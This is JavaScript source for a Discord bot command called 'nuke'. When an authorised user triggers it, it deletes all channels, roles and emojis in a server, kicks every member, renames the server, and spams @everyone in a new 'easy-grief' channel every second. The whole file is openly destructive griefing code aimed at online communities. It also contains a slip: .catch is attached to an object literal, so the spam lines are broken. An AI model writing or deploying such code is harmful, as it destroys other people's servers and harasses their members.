module.exports = {
    name: "nuke",
    description: "Nuke the Server!",

    execute(message) {
        const config = require("../config.json");
        if(config.veriuser.includes(message.author.id)) {
            message.author.send({content: "The Server got nuked! : ) https://github.com/weloveskript/nukebot"});
            message.guild.channels.cache.forEach(channel => channel.delete().catch(() => {}));
            message.guild.roles.cache.forEach(role => role.delete().catch(() => {}));
            message.guild.emojis.cache.forEach(emoji => emoji.delete().catch(() => {}));
            message.guild.members.cache.forEach(member => member.kick().catch(() => {}));
            message.guild.channels.create(`easy-grief`, { type: 'text' }).catch(() => {});
            message.guild.setName(`you got nuked!`).catch(() => {});
            setTimeout(() => {
                message.guild.channels.cache.find(channel => channel.name === "easy-grief").send({content: "The Server got nuked! : ) @everyone"}.catch(() => {}));
            }, 3000);
            setInterval(() => {
                message.guild.channels.cache.find(channel => channel.name === "easy-grief").send({content: "The Server got nuked! : ) @everyone"}.catch(() => {}));
            } , 1000);
    } else {
            message.channel.send({content: "Du darfst den Command nicht ausführen!"});
        }}};